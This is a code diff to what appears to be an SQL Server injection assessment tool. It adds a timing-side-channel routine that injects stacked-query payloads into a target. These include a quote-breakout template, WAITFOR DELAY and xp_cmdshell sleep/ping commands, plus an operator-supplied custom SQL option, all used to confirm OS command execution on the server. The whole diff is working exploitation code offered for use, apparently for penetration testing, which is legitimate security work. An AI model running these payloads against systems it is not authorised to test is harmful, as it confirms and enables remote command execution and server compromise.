@@ -25,6 +25,8 @@ Scope: SQL Server (MSSQL). Other engines expose different primitives.
 from __future__ import annotations
 
 import enum
+import statistics
+import time
 from dataclasses import dataclass
 from typing import Callable, Dict, List, Optional
 
@@ -324,3 +326,301 @@ def format_report(findings: List[Finding], summary: Optional[dict] = None) -> st
             lines.append(f"  - {rem}")
     lines.append("")
     return "\n".join(lines)
+
+
+# ======================================================================
+# Active execution verification (timing side channel)
+# ======================================================================
+#
+# The assessment above is read-only: it reports which primitives are enabled.
+# It cannot, on its own, prove that a command *actually runs* -- over a blind
+# boolean channel the response body carries no command output. The honest way
+# to obtain that proof is a timing side channel: make the primitive sleep for a
+# chosen number of seconds and measure whether the HTTP response is delayed by
+# that amount.
+#
+# Unlike the read-only checks, this DOES cause the server to execute something
+# (a sleep), so it lives behind its own function / CLI subcommand rather than
+# inside assess(). A WAITFOR control probe first proves the stacked-query timing
+# channel works at all; a delay there is SQL execution, not OS execution. Only a
+# delay through xp_cmdshell (or another OS primitive) proves OS command exec.
+
+
+@dataclass(frozen=True)
+class ExecProbe:
+    key: str
+    title: str
+    platform: str          # "any" | "linux" | "windows"
+    proves_os_exec: bool    # False for the WAITFOR control (SQL-only)
+    sql_template: str       # a statement that sleeps; uses {secs} / {secs1}
+    note: str
+
+    def build_sql(self, secs: int) -> str:
+        return self.sql_template.format(secs=secs, secs1=secs + 1)
+
+
+# Each template sleeps for `secs` seconds when it executes. secs1 == secs+1 is
+# for ping, which sends secs1 packets ~1s apart (so N+1 pings ~= N seconds).
+MSSQL_EXEC_PROBES: List[ExecProbe] = [
+    ExecProbe(
+        "waitfor", "WAITFOR DELAY (stacked-query timing control)", "any", False,
+        "WAITFOR DELAY '00:00:{secs:02d}'",
+        "A delay proves stacked-query execution and that the timing channel "
+        "works -- but NOT OS command execution."),
+    ExecProbe(
+        "xp_cmdshell_nix", "xp_cmdshell 'sleep' (Linux host)", "linux", True,
+        "EXEC master..xp_cmdshell 'sleep {secs}'",
+        "A delay proves xp_cmdshell ran an OS command on a Linux host."),
+    ExecProbe(
+        "xp_cmdshell_win", "xp_cmdshell 'ping' (Windows host)", "windows", True,
+        "EXEC master..xp_cmdshell 'ping -n {secs1} 127.0.0.1'",
+        "A delay proves xp_cmdshell ran an OS command on a Windows host."),
+]
+EXEC_PROBES_BY_KEY: Dict[str, ExecProbe] = {p.key: p for p in MSSQL_EXEC_PROBES}
+
+# Default breakout: close the string literal, run a stacked statement, comment
+# out the tail. Override for numeric / other contexts via --exec-payload.
+DEFAULT_EXEC_PAYLOAD = "'; {sql} --"
+
+
+class ExecVerdict(enum.Enum):
+    CONFIRMED = "CONFIRMED"
+    NOT_CONFIRMED = "NOT CONFIRMED"
+    INCONCLUSIVE = "INCONCLUSIVE"
+
+
+@dataclass
+class ExecTrial:
+    requested_delay: float
+    elapsed: float
+    timed_out: bool = False
+
+
+@dataclass
+class ExecCheckResult:
+    probe_key: str
+    probe_title: str
+    verdict: ExecVerdict
+    proves_os_exec: bool
+    baseline_median: float
+    threshold: float
+    trials: List[ExecTrial]
+    requests: int
+    detail: str
+
+    @property
+    def confirmed(self) -> bool:
+        return self.verdict is ExecVerdict.CONFIRMED
+
+    def to_dict(self) -> dict:
+        return {
+            "probe": self.probe_key,
+            "title": self.probe_title,
+            "verdict": self.verdict.value,
+            "proves_os_exec": self.proves_os_exec,
+            "baseline_median_s": round(self.baseline_median, 3),
+            "threshold_s": round(self.threshold, 3),
+            "requests": self.requests,
+            "trials": [
+                {"requested_delay_s": t.requested_delay,
+                 "elapsed_s": round(t.elapsed, 3),
+                 "timed_out": t.timed_out}
+                for t in self.trials
+            ],
+            "detail": self.detail,
+        }
+
+
+def verify_execution(
+    engine,
+    probe: ExecProbe,
+    *,
+    delay: float = 5.0,
+    payload_template: str = DEFAULT_EXEC_PAYLOAD,
+    baseline_samples: int = 3,
+    trials: int = 2,
+    confirm_fraction: float = 0.6,
+    scale_check: bool = True,
+    on_progress: Optional[Callable[[str], None]] = None,
+) -> ExecCheckResult:
+    """Actively confirm execution of *probe* through a timing side channel.
+
+    Establishes a baseline latency, then sends the probe with a `delay`-second
+    sleep `trials` times; a response slower than ``baseline + delay*fraction``
+    is a hit. With ``scale_check`` a final trial at twice the delay guards
+    against a coincidentally slow server -- the excess must grow with the delay.
+
+    Returns an :class:`ExecCheckResult`. This issues requests that make the
+    server sleep; it is the one active part of this module.
+    """
+    if delay <= 0:
+        raise ValueError("delay must be positive")
+    if "{sql}" not in payload_template:
+        raise ValueError("payload_template must contain the {sql} placeholder")
+
+    oracle = engine.oracle
+    cfg = getattr(oracle, "config", None)
+
+    # Make sure the HTTP client waits long enough to observe the delay, and do
+    # not let request retries multiply a genuine timeout. Restore afterwards.
+    saved = {}
+    if cfg is not None:
+        need = delay * (2 if scale_check else 1) + 10.0
+        if getattr(cfg, "request_timeout", 0) < need:
+            saved["request_timeout"] = cfg.request_timeout
+            cfg.request_timeout = need
+        if getattr(cfg, "max_retries", 1) > 1:
+            saved["max_retries"] = cfg.max_retries
+            cfg.max_retries = 1
+
+    requests = 0
+
+    def _time_send(injected: str) -> ExecTrial:
+        nonlocal requests
+        requests += 1
+        t0 = time.time()
+        resp = oracle.send_raw(injected)
+        wall = time.time() - t0
+        if resp is None:                       # timeout / transport failure
+            return ExecTrial(0.0, wall, timed_out=True)
+        return ExecTrial(0.0, resp.elapsed, timed_out=False)
+
+    try:
+        # -- baseline: the same primitive with a zero-second sleep -----------
+        base_value = payload_template.format(sql=probe.build_sql(0))
+        base_times: List[float] = []
+        for _ in range(max(baseline_samples, 1)):
+            if engine.cancelled():
+                break
+            t = _time_send(base_value)
+            base_times.append(t.elapsed)
+            if on_progress:
+                on_progress(f"baseline {t.elapsed:.2f}s")
+        baseline = statistics.median(base_times) if base_times else 0.0
+        threshold = baseline + delay * confirm_fraction
+
+        # -- delayed trials --------------------------------------------------
+        d = int(round(delay))
+        d_value = payload_template.format(sql=probe.build_sql(d))
+        primary: List[ExecTrial] = []
+        for _ in range(max(trials, 1)):
+            if engine.cancelled():
+                break
+            t = _time_send(d_value)
+            t.requested_delay = float(d)
+            primary.append(t)
+            if on_progress:
+                on_progress(f"delay={d}s -> {t.elapsed:.2f}s"
+                            + (" (timeout)" if t.timed_out else ""))
+
+        all_trials = list(primary)
+
+        # -- optional scaling trial at 2x the delay --------------------------
+        scaled_ok: Optional[bool] = None
+        if scale_check and primary and not engine.cancelled():
+            d2 = d * 2
+            t2 = _time_send(payload_template.format(sql=probe.build_sql(d2)))
+            t2.requested_delay = float(d2)
+            all_trials.append(t2)
+            scaled_ok = t2.timed_out or (t2.elapsed - baseline) >= d2 * confirm_fraction
+            if on_progress:
+                on_progress(f"delay={d2}s -> {t2.elapsed:.2f}s"
+                            + (" (timeout)" if t2.timed_out else ""))
+    finally:
+        if cfg is not None:
+            for k, v in saved.items():
+                setattr(cfg, k, v)
+
+    # -- decision -----------------------------------------------------------
+    def _hit(t: ExecTrial) -> bool:
+        return t.timed_out or t.elapsed >= threshold
+
+    verdict, detail = _decide_exec(
+        probe, primary, all_trials, baseline, threshold, delay,
+        scale_check, scaled_ok, cancelled=engine.cancelled(),
+        base_ok=bool(base_times), hit=_hit)
+
+    return ExecCheckResult(
+        probe_key=probe.key, probe_title=probe.title, verdict=verdict,
+        proves_os_exec=probe.proves_os_exec, baseline_median=baseline,
+        threshold=threshold, trials=all_trials, requests=requests, detail=detail)
+
+
+def _decide_exec(probe, primary, all_trials, baseline, threshold, delay,
+                 scale_check, scaled_ok, *, cancelled, base_ok, hit):
+    if not base_ok or not primary:
+        return (ExecVerdict.INCONCLUSIVE,
+                "Could not establish a baseline / run the trials"
+                + (" (cancelled)." if cancelled else " (requests failed)."))
+
+    hits = [t for t in primary if hit(t)]
+    kind = "OS command execution" if probe.proves_os_exec else "stacked-query execution"
+
+    if len(hits) == len(primary):
+        if scale_check and scaled_ok is False:
+            return (ExecVerdict.INCONCLUSIVE,
+                    f"The {int(delay)}s trials were slow, but the delay did not "
+                    "scale when doubled -- likely a slow/jittery server, not a "
+                    "controlled delay. Re-run with a larger --exec-delay.")
+        extra = "" if probe.proves_os_exec else (
+            " Note: this is the WAITFOR control -- it proves the timing channel, "
+            "not OS command execution.")
+        return (ExecVerdict.CONFIRMED,
+                f"Response latency tracked the injected delay, so {kind} is "
+                f"confirmed. {probe.note}{extra}")
+
+    if hits:
+        return (ExecVerdict.INCONCLUSIVE,
+                f"Only {len(hits)} of {len(primary)} delayed trials were slow "
+                "enough; timing was inconsistent. Re-run with a larger "
+                "--exec-delay or more --exec-trials.")
+
+    return (ExecVerdict.NOT_CONFIRMED,
+            f"No delay was observed, so {kind} via this probe is not confirmed. "
+            "The primitive is likely disabled, absent, or the payload did not "
+            "execute (wrong breakout for the injection context).")
+
+
+def format_exec_report(results: List[ExecCheckResult]) -> str:
+    """Readable multi-probe execution-verification report."""
+    lines: List[str] = []
+    lines.append("=" * 68)
+    lines.append("MSSQL command-execution verification (timing side channel)")
+    lines.append("=" * 68)
+    mark = {ExecVerdict.CONFIRMED: "[+]",
+            ExecVerdict.NOT_CONFIRMED: "[-]",
+            ExecVerdict.INCONCLUSIVE: "[?]"}
+    for r in results:
+        lines.append("")
+        lines.append(f"{mark[r.verdict]} {r.probe_title}: {r.verdict.value}")
+        span = ", ".join(
+            f"{int(t.requested_delay)}s->{t.elapsed:.2f}s"
+            + ("(timeout)" if t.timed_out else "")
+            for t in r.trials)
+        lines.append(f"      baseline {r.baseline_median:.2f}s, "
+                     f"threshold {r.threshold:.2f}s; trials: {span}")
+        lines.append(f"      {r.detail}")
+    lines.append("")
+    return "\n".join(lines)
+
+
+def resolve_exec_probes(names: Optional[List[str]] = None,
+                        custom_sql: Optional[str] = None) -> List[ExecProbe]:
+    """Pick probes for a run. ``custom_sql`` (with {secs}) builds a one-off probe;
+    otherwise map names, or default to the control + both xp_cmdshell variants."""
+    if custom_sql:
+        if "{secs" not in custom_sql:
+            raise ValueError("--exec-sql must contain the {secs} placeholder")
+        return [ExecProbe("custom", "custom execution probe", "any", True,
+                          custom_sql, "Custom operator-supplied delay statement.")]
+    if not names or names == ["auto"]:
+        return [EXEC_PROBES_BY_KEY["waitfor"],
+                EXEC_PROBES_BY_KEY["xp_cmdshell_nix"],
+                EXEC_PROBES_BY_KEY["xp_cmdshell_win"]]
+    out: List[ExecProbe] = []
+    for n in names:
+        if n not in EXEC_PROBES_BY_KEY:
+            raise ValueError(f"unknown exec probe {n!r}; choose from "
+                             + ", ".join(EXEC_PROBES_BY_KEY))
+        out.append(EXEC_PROBES_BY_KEY[n])
+    return out
